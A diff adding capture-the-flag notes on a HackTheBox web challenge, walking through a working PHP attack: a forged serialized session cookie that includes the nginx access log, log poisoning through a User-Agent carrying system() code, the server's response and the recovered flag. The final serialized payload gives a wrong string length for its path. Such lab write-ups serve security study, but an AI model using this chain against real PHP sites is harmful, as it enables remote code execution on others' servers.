@@ -133,5 +133,228 @@ th flag will be at : http://157.245.33.77:32397/?format=${system($_GET[1])}&1=ca
 not getting flags anymore though
 https://shakuganz.com/2021/06/23/hackthebox-lovetok-write-up/
 
+# TOXIC
+
+The entire structure is similar to lovetok.
+
+The page itself is static.
+
+in index.php we find
+
+```php
+<?php
+
+spl_autoload_register(function ($name){
+
+    if (preg_match('/Model$/', $name))
+
+    {
+
+        $name = "models/${name}";
+
+    }
+
+    include_once "${name}.php";
+
+});
+
+
+
+if (empty($_COOKIE['PHPSESSID']))
+
+{
+
+    $page = new PageModel;
+
+    $page->file = '/www/index.html';
+
+
+
+    setcookie(
+
+        'PHPSESSID', 
+
+        base64_encode(serialize($page)), 
+
+        time()+60*60*24, 
+
+        '/'
+
+    );
+
+} 
+
+
+
+$cookie = base64_decode($_COOKIE['PHPSESSID']);
+
+unserialize($cookie);
+
+
+```
+
+and in page model
+
+```php
+<?php
+class PageModel
+{
+    public $file;
+
+    public function __destruct() 
+    {
+        include($this->file);
+    }
+}
+```
+
+the page handle anything
+
+I can see it makes a phpssied cookie though
+
+can we make it load malicous cookie?
+
+```
+PHPSESSID:"Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9"
+```
+
+after decoding it we found
+
+O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}
+
+now we can put in any page inside it
+
+Request sent to get /var/log/nginx/access.log
+
+request:
+
+```
+GET /? HTTP/1.1
+
+
+Host: 134.209.17.29:32259
+
+
+User-Agent: <?php system('ls /');?>
+
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+
+
+Accept-Language: en-US,en;q=0.5
+
+
+Accept-Encoding: gzip, deflate
+
+
+DNT: 1
+
+
+Connection: close
+
+
+Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==
+
+
+Upgrade-Insecure-Requests: 1
+
+
+Cache-Control: max-age=0
+
+
+
+```
+
+
+output: 
+
+```
+HTTP/1.1 200 OK
+
+Server: nginx
+
+Date: Wed, 13 Jul 2022 18:00:57 GMT
+
+Content-Type: text/html; charset=UTF-8
+
+Connection: close
+
+X-Powered-By: PHP/7.4.15
+
+Content-Length: 5698
+
+
+
+134.209.17.29 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /static/css/production.css HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /static/js/production.js HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /static/images/flask.svg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /static/images/bucket.svg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /static/images/instagram.svg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /static/images/facebook.svg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /static/images/twitter.svg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /static/images/youtube.svg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /static/images/aircraft.svg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /static/images/ryan2.png HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /static/images/dart-frog.jpg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /static/images/ryan5.png HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /static/images/ryan3.png HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /static/images/ryan1.png HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /static/images/ryan4.png HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /static/images/ryan6.png HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /static/images/favicon.ico HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET / HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /static/js/production.js HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /asdsf HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /static/images/facebook.svg HTTP/1.1" "http://134.209.17.29:32259/?format=r" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /static/images/twitter.svg HTTP/1.1" "http://134.209.17.29:32259/?format=r" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /static/images/instagram.svg HTTP/1.1" "http://134.209.17.29:32259/?format=r" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /favicon.ico HTTP/1.1" "http://134.209.17.29:32259/?format=r" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "bin
+dev
+entrypoint.sh
+etc
+flag_Wqgfs
+home
+lib
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+www
+" 
+```
+
+
+O:9:"PageModel":1:{s:4:"file";s:25:"/flag_Wqgfs";}
+
+and add the user agent as :
+
+<?php system('cat flag_Wqgfs');?>
+
+HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}
+
+
 
 
